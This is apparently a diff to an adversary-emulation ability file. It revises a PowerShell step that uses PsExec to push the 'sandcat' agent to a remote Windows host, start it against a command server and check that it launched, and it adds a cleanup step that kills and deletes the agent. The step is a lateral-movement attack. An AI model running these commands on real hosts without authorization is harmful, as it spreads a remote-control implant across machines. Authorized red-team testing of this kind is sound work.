@@ -11,5 +11,12 @@
      windows:
        psh:
          command: |
-           C:\Windows\System32\PSTools\PsExec64.exe -accepteula \\#{remote.host.ip} -c -f sandcat.go-windows \\#{remote.host.ip}\C$\Users\Public\svchost.exe
+           $out = C:\Windows\System32\PSTools\PsExec64.exe -accepteula -nobanner \\#{remote.host.ip} -d -c -f sandcat.go-windows -server #{server} 2>&1 | %{ "$_" } | Out-String;
+           if ($out -Match "started on .* with process ID \d") {
+               cmd /c "exit 0";
+           } else {
+               cmd /c "exit 1";
+           }
          payload: sandcat.go-windows
+         cleanup: |
+           C:\Windows\System32\PSTools\PsExec64.exe -accepteula -nobanner \\#{remote.host.ip} cmd /c "taskkill /F /IM sandcat.go-windows & erase /Q /F C:\Windows\sandcat.go-windows"
